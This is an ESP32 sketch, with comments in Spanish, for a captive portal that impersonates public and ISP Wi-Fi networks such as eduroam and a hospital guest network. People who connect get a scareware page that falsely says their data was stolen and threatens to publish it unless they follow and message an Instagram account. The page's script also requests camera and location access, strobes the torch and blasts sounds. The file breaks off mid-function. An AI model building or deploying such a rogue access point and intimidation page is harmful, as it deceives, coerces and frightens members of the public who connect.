// ===== ESP32 CAPTIVE PORTAL MEJORADO ===== //

#include "WiFi.h"
#include "WebServer.h"
#include "DNSServer.h"

// ===== CONFIGURACIÓN ===== //
#ifndef LED_BUILTIN
#define LED_BUILTIN 2
#endif

const byte DNS_PORT = 53;
const unsigned long STATS_INTERVAL = 5000;
const unsigned long NETWORK_CYCLE_INTERVAL = 60000; // Cambiar red cada 1 minuto

// ===== VARIABLES GLOBALES ===== //
DNSServer dnsServer;
WebServer server(80);
unsigned long lastStats = 0;
unsigned long lastNetworkChange = 0;
int rickrollCount = 0;
int totalConnections = 0;
int currentNetworkIndex = 0;

// ===== LISTA DE REDES SÚPER ATRACTIVAS ===== //
const char* attractiveNetworks[] = {
  "!Vodafone_5GHome",
  "!MOVISTAR_PLUS_6982",
  "!JAZZTEL_2.4GHz",
  "!Orange_Livebox_9032",
  "!TP-LINK_AC750",
  "!NETGEAR_EXT",
  "!MEDUSA_IES_Campus",
  "!eduroam",
  "!WiFi_Publico_Ayto",
  "!Hospital_Guest_WiFi",
  "!Biblioteca_WiFi",
  "!iPhone_de_Carlos",
  "!Galaxy_S23_AP",
  "!Mi_Red_5GHz",
  "!FIBRA_100MB_EZ",
  "!AndroidAP_8453",
  "!INSTI_WIFI_ALUMNOS",
  "!Xiaomi_Hotspot",
  "!Casa_de_Juan_WiFi",
  "!ZTE_HomeRouter"

};

const int totalNetworks = sizeof(attractiveNetworks) / sizeof(attractiveNetworks[0]);

// ===== PÁGINA WEB CON RICKROLL EMBEDIDO ===== //
// ===== PÁGINA WEB CON EFECTO GLITCH Y SONIDO ===== //
void handleRoot() {
  rickrollCount++;
  totalConnections++;
  
  String html = R"=====(
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ACCESO NO AUTORIZADO - INFORMACIÓN COMPROMETIDA</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Courier Prime', monospace;
            background: linear-gradient(45deg, #0a0a0a, #1a1a1a);
            color: #00ff00;
            overflow-x: auto;
            animation: matrixRain 20s infinite linear;
        }
        
        @keyframes matrixRain {
            0% { background-position: 0% 0%; }
            100% { background-position: 100% 100%; }
        }
        
        .warning-banner {
            background: linear-gradient(90deg, #ff0000, #ff4444);
            color: white;
            text-align: center;
            padding: 15px;
            font-weight: bold;
            font-size: 18px;
            animation: blink 1s infinite;
            border-bottom: 3px solid #ff0000;
        }
        
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0.7; }
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin: 30px 0;
            padding: 20px;
            border: 2px solid #ff0000;
            background: rgba(255, 0, 0, 0.1);
        }
        
        .header h1 {
            color: #ff0000;
            font-size: 2.5em;
            text-shadow: 0 0 10px #ff0000;
            margin-bottom: 10px;
        }
        
        .header .subtitle {
            color: #ffff00;
            font-size: 1.2em;
            margin-bottom: 15px;
        }
        
        .timestamp {
            color: #00ffff;
            font-size: 0.9em;
        }
        
        .data-section {
            background: rgba(0, 20, 0, 0.8);
            border: 1px solid #00ff00;
            border-radius: 5px;
            margin: 20px 0;
            padding: 20px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }
        
        .section-title {
            color: #ff4444;
            font-size: 1.4em;
            font-weight: bold;
            margin-bottom: 15px;
            text-transform: uppercase;
            border-bottom: 2px solid #ff4444;
            padding-bottom: 5px;
        }
        
        .data-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
        }
        
        .data-item {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid #444;
            border-left: 4px solid #00ff00;
            padding: 15px;
            border-radius: 3px;
        }
        
        .data-label {
            color: #ffff00;
            font-weight: bold;
            text-transform: uppercase;
            font-size: 0.9em;
        }
        
        .data-value {
            color: #00ff00;
            margin-top: 5px;
            font-size: 1.1em;
            word-break: break-all;
        }
        
        .critical {
            border-left-color: #ff0000;
            background: rgba(255, 0, 0, 0.1);
        }
        
        .critical .data-value {
            color: #ff6666;
            font-weight: bold;
        }
        
        .loading {
            color: #ffff00;
            animation: pulse 1s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .security-code {
            background: rgba(255, 0, 0, 0.2);
            border: 2px solid #ff0000;
            padding: 20px;
            margin: 30px 0;
            text-align: center;
        }
        
        .security-code h3 {
            color: #ff0000;
            margin-bottom: 15px;
            font-size: 1.3em;
        }
        
        .code-display {
            background: #000;
            color: #00ff00;
            padding: 15px;
            font-size: 1.5em;
            font-weight: bold;
            border: 1px solid #00ff00;
            letter-spacing: 3px;
            margin: 10px 0;
        }
        
        .warning-text {
            color: #ff4444;
            font-size: 0.9em;
            margin-top: 10px;
            line-height: 1.4;
        }
        
        .status-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 8px;
        }
        
        .status-online { background: #00ff00; }
        .status-warning { background: #ffff00; }
        .status-critical { background: #ff0000; }
        
        #map {
            height: 300px;
            width: 100%;
            background: #000;
            border: 2px solid #00ff00;
            border-radius: 5px;
            margin-top: 15px;
            position: relative;
        }
        
        .terminal-line {
            font-family: 'Courier Prime', monospace;
            color: #00ff00;
            margin: 5px 0;
        }
        
        .terminal-line::before {
            content: "> ";
            color: #ffff00;
        }
        
        .footer-warning {
            background: rgba(255, 0, 0, 0.9);
            color: white;
            padding: 20px;
            text-align: center;
            margin-top: 30px;
            font-weight: bold;
            border: 3px solid #ff0000;
        }
    </style>
</head>
<body>
    <div class="warning-banner">
        ⚠️ ALERTA DE SEGURIDAD - INFORMACIÓN PERSONAL COMPROMETIDA ⚠️
    </div>
    
    <div class="container">
        <div class="header">
            <h1>🚨 ACCESO NO AUTORIZADO DETECTADO 🚨</h1>
            <div class="subtitle">Su información personal ha sido extraída exitosamente</div>
            <div class="subtitle">Ve a instagram a continuacion sigue y escribe a este usuario @lightviper_ el siguiente codigo:</div>
            <div class="timestamp">Timestamp: <span id="currentTime"></span></div>
        </div>
        
        <div class="security-code">
            <h3>⚠️ CÓDIGO DE SEGURIDAD GENERADO ⚠️</h3>
            <div class="code-display" id="securityCode">Generando...</div>
            <div class="warning-text">
                Este código contiene información sensible sobre su dispositivo.<br>
                <strong>NO COMPARTA ESTE CÓDIGO CON NADIE</strong><br>
                Si recibió este enlace por mensaje, su seguridad puede estar comprometida.
            </div>
            <div class="subtitle">Sus datos seran publicados a menos que haya hecho el paso anterior.</div>
        </div>

        <div class="data-section">
            <div class="section-title">🌐 Información de Red Comprometida</div>
            <div class="data-grid">
                <div class="data-item critical">
                    <div class="data-label">🔴 IP Pública Expuesta:</div>
                    <div class="data-value" id="publicIP">Censored</div>
                </div>
                <div class="data-item critical">
                    <div class="data-label">🔴 IP Local Interna:</div>
                    <div class="data-value" id="localIP">Escaneando red...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Proveedor de Internet:</div>
                    <div class="data-value" id="isp">Censored</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Organización de Red:</div>
                    <div class="data-value" id="org">Censored</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Tipo de Conexión:</div>
                    <div class="data-value" id="connectionType">Detectando...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Velocidad de Conexión:</div>
                    <div class="data-value" id="connectionSpeed">Midiendo...</div>
                </div>
            </div>
        </div>

        <div class="data-section">
            <div class="section-title">📍 Ubicación Geográfica Rastreada</div>
            <div class="data-grid">
                <div class="data-item critical">
                    <div class="data-label">🔴 País Identificado:</div>
                    <div class="data-value" id="country">Censored/Pais guardado en la DataBase.</div>
                </div>
                <div class="data-item critical">
                    <div class="data-label">🔴 Región/Estado:</div>
                    <div class="data-value" id="region">Censored/Región guardada en la DataBase.</div>
                </div>
                <div class="data-item critical">
                    <div class="data-label">🔴 Ciudad Exacta:</div>
                    <div class="data-value" id="city">Precisando ubicación.../Ciudad extraida.</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Código Postal:</div>
                    <div class="data-value" id="zip">Calculando.../ / / ERROR</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Zona Horaria:</div>
                    <div class="data-value" id="timezone">Sincronizando...</div>
                </div>
                <div class="data-item critical">
                    <div class="data-label">🔴 Coordenadas GPS Exactas:</div>
                    <div class="data-value" id="coordinates">Satelites GPS activos...</div>
                </div>
            </div>
            <div id="map"></div>
        </div>

        <div class="data-section">
            <div class="section-title">💻 Información del Navegador Interceptada</div>
            <div class="data-grid">
                <div class="data-item">
                    <div class="data-label">Navegador Identificado:</div>
                    <div class="data-value" id="browser">Analizando...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Versión Exacta:</div>
                    <div class="data-value" id="browserVersion">Verificando...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">User Agent Completo:</div>
                    <div class="data-value" id="userAgent">Capturando...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Idiomas Configurados:</div>
                    <div class="data-value" id="languages">Detectando...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Estado de Cookies:</div>
                    <div class="data-value" id="cookiesEnabled">Verificando...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Capacidades Java:</div>
                    <div class="data-value" id="javaEnabled">Escaneando...</div>
                </div>
            </div>
        </div>

        <div class="data-section">
            <div class="section-title">📱 Información del Dispositivo Extraída</div>
            <div class="data-grid">
                <div class="data-item critical">
                    <div class="data-label">🔴 Sistema Operativo:</div>
                    <div class="data-value" id="os">Identificando SO...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Plataforma de Hardware:</div>
                    <div class="data-value" id="platform">Analizando hardware...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Arquitectura del CPU:</div>
                    <div class="data-value" id="architecture">Detectando arquitectura...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Núcleos de Procesador:</div>
                    <div class="data-value" id="cores">Contando núcleos...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Memoria RAM Disponible:</div>
                    <div class="data-value" id="memory">Midiendo RAM...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Tipo de Dispositivo:</div>
                    <div class="data-value" id="deviceType">Clasificando dispositivo...</div>
                </div>
            </div>
        </div>

        <div class="data-section">
            <div class="section-title">🖥️ Configuración de Pantalla Capturada</div>
            <div class="data-grid">
                <div class="data-item">
                    <div class="data-label">Resolución Total:</div>
                    <div class="data-value" id="resolution">Midiendo pantalla...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Resolución Disponible:</div>
                    <div class="data-value" id="availResolution">Calculando área útil...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Profundidad de Color:</div>
                    <div class="data-value" id="colorDepth">Analizando colores...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Densidad de Píxeles:</div>
                    <div class="data-value" id="pixelRatio">Calculando DPI...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Orientación Actual:</div>
                    <div class="data-value" id="orientation">Detectando orientación...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Pantalla Táctil:</div>
                    <div class="data-value" id="touchScreen">Verificando touch...</div>
                </div>
            </div>
        </div>

        <div class="data-section">
            <div class="section-title">🔒 Análisis de Seguridad Avanzado</div>
            <div class="data-grid">
                <div class="data-item">
                    <div class="data-label">Conexión HTTPS:</div>
                    <div class="data-value" id="https">Verificando encriptación...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Do Not Track:</div>
                    <div class="data-value" id="doNotTrack">Analizando privacidad...</div>
                </div>
                <div class="data-item critical">
                    <div class="data-label">🔴 WebRTC Status:</div>
                    <div class="data-value" id="webrtc">Buscando vulnerabilidades...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Ad Blocker Detectado:</div>
                    <div class="data-value" id="adBlocker">Escaneando extensiones...</div>
                </div>
                <div class="data-item">
                    <div class="data-label">Plugins Instalados:</div>
                    <div class="data-value" id="plugins">Enumerando plugins...</div>
                </div>
                <div class="data-item critical">
                    <div class="data-label">🔴 Canvas Fingerprint:</div>
                    <div class="data-value" id="canvas">Generando huella digital...</div>
                </div>
            </div>
        </div>

        <div class="data-section">
            <div class="section-title">⚡ Estado del Sistema en Tiempo Real</div>
            <div class="terminal-line">Iniciando escaneo de puertos...</div>
            <div class="terminal-line">Verificando servicios activos...</div>
            <div class="terminal-line">Analizando vulnerabilidades conocidas...</div>
            <div class="terminal-line">Extrayendo metadatos del dispositivo...</div>
            <div class="terminal-line"><span class="status-indicator status-critical"></span>CRÍTICO: Información personal expuesta</div>
            <div class="terminal-line"><span class="status-indicator status-warning"></span>ADVERTENCIA: Ubicación rastreada</div>
            <div class="terminal-line"><span class="status-indicator status-online"></span>ACTIVO: Monitoreo en tiempo real</div>
        </div>

        <div class="footer-warning">
            <h2>⚠️ IMPORTANTE ⚠️</h2>
            <p>Al completar la verificacion sus datos seran borrados y volveras a estar a salvo.</p>
            <p><strong>NUNCA dejes de seguir por redes al usuario @lightviper_</strong></p>
            <p>Tu seguridad digital es muy importante. Asi que... ya sabes.</p>
        </div>
    </div>

    <script>
// Efectos de broma completos - Todo tipo de efectos de hardware
let efectosActivos = false;
let intervalosEfectos = [];
let streamCamara = null;
let audioContext = null;
let tienePermisoCamara = false;
let tienePermisoGeo = false;
let sensores = {
    acelerometro: null,
    giroscopio: null,
    magnetometro: null
};

// Función para crear sonidos potentes y variados
function crearSonidoMalvado() {
    try {
        if (!audioContext) {
            audioContext = new (window.AudioContext || window.webkitAudioContext)();
        }

        const oscilador = audioContext.createOscillator();
        const ganancia = audioContext.createGain();
        const filtro = audioContext.createBiquadFilter();
        
        oscilador.connect(filtro);
        filtro.connect(ganancia);
        ganancia.connect(audioContext.destination);
        
        // Sonido más potente y aterrador
        oscilador.frequency.setValueAtTime(150, audioContext.currentTime);
        oscilador.frequency.exponentialRampToValueAtTime(500, audioContext.currentTime + 0.1);
        oscilador.frequency.exponentialRampToValueAtTime(100, audioContext.currentTime + 0.3);
        oscilador.frequency.exponentialRampToValueAtTime(400, audioContext.currentTime + 0.6);
        
        // Volumen al máximo posible
        ganancia.gain.setValueAtTime(0.8, audioContext.currentTime);
        ganancia.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 1.2);
        
        filtro.frequency.setValueAtTime(1000, audioContext.currentTime);
        filtro.Q.value = 15;
        
        oscilador.type = 'sawtooth';
        oscilador.start(audioContext.currentTime);
        oscilador.stop(audioContext.currentTime + 1.2);
        
    } catch (e) {
        console.log('Error creando sonido malvado:', e);
    }
}

function crearSonidoSirena() {
    try {
        if (!audioContext) return;
        
        const oscilador = audioContext.createOscillator();
        const ganancia = audioContext.createGain();
        
        oscilador.connect(ganancia);
        ganancia.connect(audioContext.destination);
        
        // Sirena potente
        oscilador.frequency.setValueAtTime(200, audioContext.currentTime);
        oscilador.frequency.exponentialRampToValueAtTime(800, audioContext.currentTime + 0.5);
        oscilador.frequency.exponentialRampToValueAtTime(200, audioContext.currentTime + 1);
        oscilador.frequency.exponentialRampToValueAtTime(800, audioContext.currentTime + 1.5);
        
        ganancia.gain.setValueAtTime(0.9, audioContext.currentTime);
        ganancia.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 1.8);
        
        oscilador.type = 'square';
        oscilador.start(audioContext.currentTime);
        oscilador.stop(audioContext.currentTime + 1.8);
        
    } catch (e) {}
}

function crearSonidoRugido() {
    try {
        if (!audioContext) return;
        
        // Crear ruido blanco para simular rugido
        const bufferSize = audioContext.sampleRate * 0.8;
        const buffer = audioContext.createBuffer(1, bufferSize, audioContext.sampleRate);
        const data = buffer.getChannelData(0);
        
        for (let i = 0; i < bufferSize; i++) {
            data[i] = (Math.random() * 2 - 1) * Math.sin(i / bufferSize * Math.PI);
        }
        
        const source = audioContext.createBufferSource();
        const ganancia = audioContext.createGain();
        const filtro = audioContext.createBiquadFilter();
        
        source.buffer = buffer;
        source.connect(filtro);
        filtro.connect(ganancia);
        ganancia.connect(audioContext.destination);
        
        filtro.type = 'lowpass';
        filtro.frequency.setValueAtTime(300, audioContext.currentTime);
        
        ganancia.gain.setValueAtTime(0.7, audioContext.currentTime);
        ganancia.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.8);
        
        source.start(audioContext.currentTime);
        
    } catch (e) {}
}

function crearSonidoLatido() {
    try {
        if (!audioContext) return;
        
        const oscilador = audioContext.createOscillator();
        const ganancia = audioContext.createGain();
        
        oscilador.connect(ganancia);
        ganancia.connect(audioContext.destination);
        
        // Simular latido del corazón
        oscilador.frequency.value = 60;
        
        ganancia.gain.setValueAtTime(0, audioContext.currentTime);
        ganancia.gain.linearRampToValueAtTime(0.6, audioContext.currentTime + 0.05);
        ganancia.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
        ganancia.gain.linearRampToValueAtTime(0.4, audioContext.currentTime + 0.4);
        ganancia.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.7);
        
        oscilador.type = 'sine';
        oscilador.start(audioContext.currentTime);
        oscilador.stop(audioContext.currentTime + 0.7);
        
    } catch (e) {}
}

// Función para reproducir sonidos variados y potentes
function iniciarSonidos() {
    const sonidos = [crearSonidoMalvado, crearSonidoSirena, crearSonidoRugido, crearSonidoLatido];
    
    // Sonido inicial potente
    crearSonidoMalvado();
    
    // Sonidos aleatorios frecuentes
    const intervaloSonidos = setInterval(() => {
        if (efectosActivos) {
            const sonidoAleatorio = sonidos[Math.floor(Math.random() * sonidos.length)];
            sonidoAleatorio();
        } else {
            clearInterval(intervaloSonidos);
        }
    }, Math.random() * 1500 + 1000); // Entre 1-2.5 segundos
    
    intervalosEfectos.push(intervaloSonidos);
}

// Patrones de vibración creativos
function iniciarVibracion() {
    if (!('vibrate' in navigator)) return;
    
    // Patrón inicial agresivo
    const patronInicial = [300, 100, 500, 150, 800, 200, 1000, 100, 300, 50, 1200];
    navigator.vibrate(patronInicial);
    
    // Vibración continua variada
    const intervaloVibra = setInterval(() => {
        if (efectosActivos) {
            const patrones = [
                [200, 100, 200, 100, 200], // Rápido
                [1000, 300, 1000], // Intenso
                [100, 50, 100, 50, 100, 50, 100, 50], // Morse
                [500, 200, 300, 100, 800] // Irregular
            ];
            const patron = patrones[Math.floor(Math.random() * patrones.length)];
            navigator.vibrate(patron);
        } else {
            clearInterval(intervaloVibra);
        }
    }, 3000);
    
    intervalosEfectos.push(intervaloVibra);
    
    // Vibración tipo latido
    const vibracionLatido = setInterval(() => {
        if (efectosActivos) {
            navigator.vibrate([200, 300, 400, 600]); // Simula latido acelerado
        } else {
            clearInterval(vibracionLatido);
        }
    }, 5000);
    
    intervalosEfectos.push(vibracionLatido);
}

// FUNCIÓN PRINCIPAL PARA PEDIR PERMISO DE CÁMARA INMEDIATAMENTE
async function pedirPermisoCamaraInmediato() {
    try {
        console.log('Pidiendo permiso de cámara...');
        
        // Pedir permiso de cámara con la cámara trasera específicamente
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: { ideal: "environment" }, // Cámara trasera preferida
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }
        });
        
        streamCamara = stream;
        tienePermisoCamara = true;
        console.log('Permiso de cámara concedido');
        
        return true;
        
    } catch (error) {
        console.log('Error al pedir permiso de cámara:', error);
        tienePermisoCamara = false;
        
        // Si falla con cámara trasera, intentar con cualquier cámara
        try {
            const streamGeneral = await navigator.mediaDevices.getUserMedia({
                video: true
            });
            streamCamara = streamGeneral;
            tienePermisoCamara = true;
            console.log('Permiso de cámara concedido (cámara general)');
            return true;
        } catch (errorGeneral) {
            console.log('No se pudo obtener acceso a ninguna cámara');
            return false;
        }
    }
}

// Activar flash con parpadeo intenso (usando el stream ya obtenido)
function activarLinterna() {
    if (!streamCamara || !tienePermisoCamara) {
        console.log('No hay acceso a cámara para linterna');
        return;
    }
    
    try {
        const track = streamCamara.getVideoTracks()[0];
        const capabilities = track.getCapabilities();
        
        if (capabilities.torch) {
            console.log('Activando linterna...');
            
            // Parpadeo intenso y rápido
            let linternaEncendida = false;
            const intervaloLinterna = setInterval(async () => {
                if (efectosActivos && track.readyState === 'live') {
                    try {
                        await track.applyConstraints({
                            advanced: [{ torch: !linternaEncendida }]
                        });
                        linternaEncendida = !linternaEncendida;
                    } catch (e) {
                        console.log('Error controlando linterna:', e);
                    }
                } else {
                    clearInterval(intervaloLinterna);
                    if (track.readyState === 'live') {
                        try {
                            await track.applyConstraints({
                                advanced: [{ torch: false }]
                            });
                        } catch (e) {}
                    }
                }
            }, 150); // Parpadeo muy rápido
            
            intervalosEfectos.push(intervaloLinterna);
        } else {
            console.log('Este dispositivo no soporta linterna');
        }
        
    } catch (error) {
        console.log('Error activando linterna:', error);
    }
}

// Sensores de movimiento
function iniciarSensores() {
    // Acelerómetro - detecta sacudidas
    if (window.DeviceMotionEvent) {
        const manejarMovimiento = (event) => {
            if (!efectosActivos) return;
            
            const aceleracion = event.accelerationIncludingGravity;
            if (aceleracion) {
                const fuerza = Math.abs(aceleracion.x) + Math.abs(aceleracion.y) + Math.abs(aceleracion.z);
                
                // Si detecta sacudida fuerte, intensificar efectos
                if (fuerza > 25) {
                    navigator.vibrate && navigator.vibrate([500, 100, 500, 100, 500]);
                    crearSonidoSirena();
                }
            }
        };
        
        window.addEventListener('devicemotion', manejarMovimiento);
        intervalosEfectos.push(() => window.removeEventListener('devicemotion', manejarMovimiento));
    }
    
    // Giroscopio - detecta rotación
    if (window.DeviceOrientationEvent) {
        let orientacionAnterior = null;
        
        const manejarOrientacion = (event) => {
            if (!efectosActivos) return;
            
            if (orientacionAnterior) {
                const cambioAlpha = Math.abs(event.alpha - orientacionAnterior.alpha);
                const cambioBeta = Math.abs(event.beta - orientacionAnterior.beta);
                const cambioGamma = Math.abs(event.gamma - orientacionAnterior.gamma);
                
                // Si rota rápido, activar efectos
                if (cambioAlpha > 30 || cambioBeta > 30 || cambioGamma > 30) {
                    navigator.vibrate && navigator.vibrate([300, 50, 300]);
                    crearSonidoLatido();
                }
            }
            
            orientacionAnterior = {
                alpha: event.alpha,
                beta: event.beta,
                gamma: event.gamma
            };
        };
        
        window.addEventListener('deviceorientation', manejarOrientacion);
        intervalosEfectos.push(() => window.removeEventListener('deviceorientation', manejarOrientacion));
    }
}

// Detectar información del dispositivo
function efectosBasadosEnDispositivo() {
    // Detectar nivel de batería
    if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
            if (battery.level < 0.2) {
                // Si batería baja, sonidos más intensos
                const intervaloVacioBateria = setInterval(() => {
                    if (efectosActivos) {
                        crearSonidoSirena();
                        navigator.vibrate && navigator.vibrate([1000, 200, 1000]);
                    } else {
                        clearInterval(intervaloVacioBateria);
                    }
                }, 2000);
                intervalosEfectos.push(intervaloVacioBateria);
            }
        });
    }
    
    // Detectar tipo de conexión
    if ('connection' in navigator) {
        const conexion = navigator.connection;
        if (conexion && conexion.effectiveType === '4g') {
            // En 4G, efectos más intensos
            setTimeout(() => {
                if (efectosActivos) {
                    crearSonidoRugido();
                    navigator.vibrate && navigator.vibrate([800, 200, 800, 200, 800]);
                }
            }, 2000);
        }
    }
}

// Geolocalización para efectos basados en ubicación
function iniciarGeolocalizacion() {
    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                tienePermisoGeo = true;
                // Efectos basados en coordenadas (más creativos)
                const lat = Math.abs(position.coords.latitude);
                const lng = Math.abs(position.coords.longitude);
                
                // Usar coordenadas para variar efectos
                const factor = (lat + lng) % 5;
                setTimeout(() => {
                    if (efectosActivos) {
                        for (let i = 0; i < factor; i++) {
                            setTimeout(() => crearSonidoMalvado(), i * 200);
                        }
                    }
                }, 1000);
            },
            () => {
                tienePermisoGeo = false;
            }
        );
    }
}

// Detectar cambios de visibilidad y orientación
function efectosDeVisibilidad() {
    // Detectar cuando vuelve a la página
    document.addEventListener('visibilitychange', () => {
        if (!document.hidden && efectosActivos) {
            // Al volver, efecto de "sorpresa"
            crearSonidoSirena();
            navigator.vibrate && navigator.vibrate([500, 100, 500, 100, 500]);
        }
    });
    
    // Detectar cambios de orientación
    window.addEventListener('orientationchange', () => {
        if (efectosActivos) {
            setTimeout(() => {
                crearSonidoRugido();
                navigator.vibrate && navigator.vibrate([1000, 300, 1000]);
            }, 500);
        }
    });
}

// Función para detener todos los efectos
function detenerEfectos() {
    efectosActivos = false;
    
    // Detener vibración
    if ('vibrate' in navigator) {
        navigator.vibrate(0);
    }
    
    // Limpiar todos los intervalos y eventos
    intervalosEfectos.forEach(intervalo => {
        if (typeof intervalo === 'function') {
            intervalo(); // Ejecutar función de limpieza
        } else {
            clearInterval(intervalo);
        }
    });
    intervalosEfectos = [];
    
    // Cerrar cámara y apagar linterna
    if (streamCamara) {
        streamCamara.getTracks().forEach(track => {
            if (track.kind === 'video' && track.readyState === 'live') {
                try {
                    track.applyConstraints({
                        advanced: [{ torch: false }]
                    }).then(() => {
                        track.stop();
                    }).catch(() => {
                        track.stop();
                    });
                } catch (e) {
                    track.stop();
                }
            } else {
                track.stop();
            }
        });
        streamCamara = null;
    }
    
    // Detener contexto de audio
    if (audioContext) {
        try {
            audioContext.close();
            audioContext = null;
        } catch (e) {}
    }
}

// Función principal que inicia todos los efectos
async function iniciarEfectosBroma() {
    if (efectosActivos) return;
    
    console.log('Iniciando efectos de broma...');
    efectosActivos = true;
    
    // Iniciar todos los efectos inmediatamente
    iniciarVibracion();
    iniciarSonidos();
    iniciarSensores();
    efectosBasadosEnDispositivo();
    efectosDeVisibilidad();
    
    // Activar linterna (ya tenemos el stream de cámara)
    activarLinterna();
    
    // Geolocalización
    iniciarGeolocalizacion();
    
    // Auto-detener después de 45 segundos
    setTimeout(() => {
        console.log('Deteniendo efectos automáticamente...');
        detenerEfectos();
    }, 45000);
}

// FUNCIÓN PRINCIPAL REORGANIZADA - PIDE CÁMARA PRIMERO
async function inicializarBroma() {
    console.log('Inicializando broma...');
    
    // 1. PRIMERO: Pedir permiso de cámara inmediatamente
    const tieneCamera = await pedirPermisoCamaraInmediato();
    
    // 2. Pedir permisos de sensores en iOS si es necesario
    if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
        try {
            await DeviceOrientationEvent.requestPermission();
        } catch (e) {
            console.log('No se pudo obtener permiso de orientación');
        }
    }
    
    if (typeof DeviceMotionEvent !== 'undefined' && typeof DeviceMotionEvent.requestPermission === 'function') {
        try {
            await DeviceMotionEvent.requestPermission();
        } catch (e) {
            console.log('No se pudo obtener permiso de movimiento');
        }
    }
    
    // 3. Pedir geolocalización
    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(() => {}, () => {});
    }
    
    // 4. INICIAR EFECTOS INMEDIATAMENTE después de pedir permisos
    setTimeout(() => {
        iniciarEfectosBroma();
    }, 500); // Pequeño delay para asegurar que los permisos se procesaron
}

// EJECUTAR INMEDIATAMENTE AL CARGAR LA PÁGINA
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', inicializarBroma);
} else {
    // Si ya cargó, ejecutar inmediatamente
    inicializarBroma();
}

// Event listeners de respaldo por si el usuario necesita interactuar primero
document.addEventListener('click', function(e) {
    if (!efectosActivos) {
        inicializarBroma();
    }
}, { once: true });

document.addEventListener('touchstart', function(e) {
    if (!efectosActivos) {
        inicializarBroma();
    }
}, { once: true });

// Limpiar al cerrar la página
window.addEventListener('beforeunload', function() {
    detenerEfectos();
});

// Función global para detener manualmente (por si acaso)
window.detenerBroma = detenerEfectos;
        // Generar código de seguridad único
        function generateSecurityCode() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let code = '';
            for (let i = 0; i < 12; i++) {
                code += chars.charAt(Math.floor(Math.random() * chars.length));
                if (i % 4 === 3 && i < 11) code += '-';
            }
            return code;
        }

        // Mostrar timestamp actual
        function updateTimestamp() {
            const now = new Date();
            document.getElementById('currentTime').textContent = now.toLocaleString();
        }

        // Información básica del navegador
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browserName = "Navegador Desconocido";
            let browserVersion = "Versión No Identificada";
            
            if (ua.indexOf("Chrome") > -1 && ua.indexOf("Edge") === -1) {
                browserName = "Google Chrome";
                const match = ua.match(/Chrome\/([0-9.]+)/);
                browserVersion = match ? match[1] : "Desconocida";
            } else if (ua.indexOf("Firefox") > -1) {
                browserName = "Mozilla Firefox";
                const match = ua.match(/Firefox\/([0-9.]+)/);
                browserVersion = match ? match[1] : "Desconocida";
            } else if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) {
                browserName = "Safari";
                const match = ua.match(/Version\/([0-9.]+)/);
                browserVersion = match ? match[1] : "Desconocida";
            } else if (ua.indexOf("Edge") > -1) {
                browserName = "Microsoft Edge";
                const match = ua.match(/Edge\/([0-9.]+)/);
                browserVersion = match ? match[1] : "Desconocida";
            }
            
            setTimeout(() => {
                document.getElementById('browser').textContent = browserName;
                document.getElementById('browserVersion').textContent = browserVersion;
                document.getElementById('userAgent').textContent = ua;
                document.getElementById('languages').textContent = navigator.languages ? navigator.languages.join(', ') : navigator.language;
                document.getElementById('cookiesEnabled').textContent = navigator.cookieEnabled ? '✅ Habilitadas (VULNERABLE)' : '❌ Deshabilitadas';
                document.getElementById('javaEnabled').textContent = (navigator.javaEnabled && navigator.javaEnabled()) ? '✅ Java Activo' : '❌ Java Inactivo';
            }, 2000);
        }

        // Información del sistema operativo
        function getOSInfo() {
